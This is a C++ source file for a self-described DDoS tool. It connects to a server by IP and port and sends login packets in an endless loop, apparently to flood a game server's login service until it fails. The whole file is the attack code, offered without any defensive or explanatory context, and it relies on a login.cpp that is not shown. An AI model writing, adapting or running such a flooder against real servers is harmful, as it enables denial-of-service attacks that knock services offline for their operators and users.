#include <iostream>
#include <stdio.h>
#include <sys/types.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<unistd.h>
#include "login.cpp"
class DDoS
{
	public:
	int s;
	void conn(char* ip, int port);
	void destroy();
};
void DDoS::conn(char* ip, int port)
{
	auto sock = socket(AF_INET, SOCK_STREAM, 0);//socket
	struct sockaddr_in server;
	server.sin_family = AF_INET; 
	server.sin_port = htons(port);//server port
	inet_pton(AF_INET, ip, &server.sin_addr);//server ipv4
	if(connect(sock, (struct sockaddr *)&server, sizeof(server))<0)
	{
		destroy();
		std::cerr << "Server is down/Ur ip banned!";
		return;
	}
	s=sock;
	while (true)
	{
		try
	{
		LoginMessage login;
		login.client = sock;
		login.encode();
		std::cout << "Packet sended!\n";
	}
	catch (std::exception *e)
	{
		destroy();
		std::cerr << "Error by sending packet: " << e;
	}
	}
}
void DDoS::destroy()
{
	close(s);
}
int main()
{
	DDoS d;
	d.conn("0.0.0.0", 9339);
}